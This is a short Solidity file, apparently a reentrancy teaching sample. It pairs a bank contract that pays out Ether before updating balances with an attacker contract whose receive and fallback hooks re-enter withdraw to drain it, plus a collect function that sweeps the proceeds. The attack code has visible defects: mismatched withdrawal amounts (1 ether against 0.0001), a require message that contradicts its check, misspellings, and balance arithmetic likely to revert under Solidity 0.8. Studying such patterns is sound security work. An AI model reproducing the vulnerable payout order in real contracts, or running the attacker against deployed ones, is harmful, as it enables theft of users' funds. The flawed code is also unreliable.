```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.24;

contract VulnerableReentrancy {
    mapping(address => uint) public balances;
    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw(uint _amount) public {
        require(balances[msg.sender] >= _amount, "Insufficient balance");
        (bool success, ) = msg.sender.call{value: _amount}("");
        require(success, "Transfer failed");
        balances[msg.sender] -= _amount;
    }
}

contract ReeentrancyAttactker {
    VulnerableReentrancy public vulnerableBank;

    constructor(address _vulnerableBankAddress) {
        vulnerableBank = VulnerableReentrancy(_vulnerableBankAddress);
    }

    fallback() external payable {
        if (address(vulnerableBank).balance >= 0.0001 ether) {
            vulnerableBank.withdraw(1 ether);
        }
    }

    receive() external payable {
        if (address(vulnerableBank).balance >= 0.0001 ether) {
            vulnerableBank.withdraw(0.0001 ether);
        }
    }


    function acctacker() public payable{
        require(msg.value > 0.0001 ether,"minimun 1 ehter required to attack");
        vulnerableBank.deposit{value: 0.0001 ether}();
        vulnerableBank.withdraw((0.0001 ether));
    }

    function collect() public{
        payable(msg.sender).transfer(address(this).balance);
    }
}
```